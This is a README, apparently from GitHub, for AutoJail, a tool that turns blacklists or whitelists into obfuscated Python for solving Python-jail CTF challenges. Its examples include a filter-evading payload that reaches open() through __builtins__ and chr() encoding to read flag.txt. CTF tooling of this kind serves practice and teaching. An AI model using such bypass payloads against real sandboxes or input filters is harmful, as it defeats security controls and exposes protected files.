# AutoJail Python

AutoJail is a tool for automatically solving python jail CTF challenges. This program takes in a blacklist/whitelist and generates valid python that, when ran, will execute the desired code.

⚠️ This project is still in development ⚠️

## Getting started

```
git clone git@github.com:martcl/autojail.git
pip install ./autojail
autojail -h
```

## Examples

**Open a file with a blacklist**
```
autojail -o flag.txt -b open "'" '"'

print(*__builtins__.__dict__[chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)))
```

**Generate strings**
```
autojail --string HEI --blacklist H c ᶜ 0 7

'%\143'%(int(repr(int(not())+(int(not())+int(not()))+(int(not())+int(not()))**(int(not())+int(not())))+repr(2)))+'%\143'%(69)+'%\143'%(int(repr(int(not())+(int(not())+int(not()))+(int(not())+int(not()))**(int(not())+int(not())))+repr(3)))
```

**Create any number using whitelist**
```
autojail -n 22 -w 0 1 b

0b10110
```


## Usage
```
usage: main.py [-h] [-b [BLACKLIST ...]] [-w [WHITELIST ...]] [-s STRING]
               [-n NUMBER] [-o FILE_PATH]

Autojail is a tool for automatically solving python jail CTF challenges.

options:
  -h, --help            show this help message and exit
  -b [BLACKLIST ...], --blacklist [BLACKLIST ...]
                        A list of blacklisted kwds not allowed.
  -w [WHITELIST ...], --whitelist [WHITELIST ...]
                        A list of whitelisted kwds allowd to use.
  -s STRING, --string STRING
                        Create a string.
  -n NUMBER, --number NUMBER
                        Create a number.
  -o FILE_PATH, --open FILE_PATH
                        Open a file and read it.

```
